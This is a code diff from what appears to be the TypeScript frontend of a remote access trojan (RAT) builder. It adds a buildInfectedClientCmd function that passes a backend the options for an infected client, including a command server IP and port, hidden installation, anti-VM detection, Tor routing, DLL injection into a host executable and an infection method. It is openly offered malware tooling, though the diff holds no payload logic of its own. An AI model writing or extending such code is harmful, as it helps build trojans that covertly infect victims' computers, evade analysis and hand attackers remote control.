@@ -53,6 +53,50 @@ export const buildClientCmd = async (
   });
 };
 
+export const buildInfectedClientCmd = async (
+  ip: string,
+  port: string,
+  mutexEnabled: boolean,
+  mutex: string,
+  unattendedMode: boolean,
+  assemblyInfo: AssemblyInfo,
+  enableIcon: boolean,
+  iconPath: string,
+  enableInstall: boolean,
+  installFolder: string,
+  installFileName: string,
+  group: string,
+  enableHidden: boolean,
+  antiVmDetection: boolean,
+  useTor: boolean,
+  torAddress: string,
+  dllName: string,
+  hostExePath: string,
+  infectionMethod: string
+): Promise<void> => {
+  return invoke("build_infected_client", {
+    ip,
+    port,
+    mutexEnabled,
+    mutex,
+    unattendedMode,
+    assemblyInfo,
+    enableIcon,
+    iconPath,
+    enableInstall,
+    installFolder,
+    installFileName,
+    group,
+    enableHidden,
+    antiVmDetection,
+    useTor,
+    torAddress,
+    dllName,
+    hostExePath,
+    infectionMethod,
+  });
+};
+
 export const fetchClientsCmd = async (): Promise<RATClient[]> => {
   let clients: RATClient[] = await invoke("fetch_clients");
   return clients;
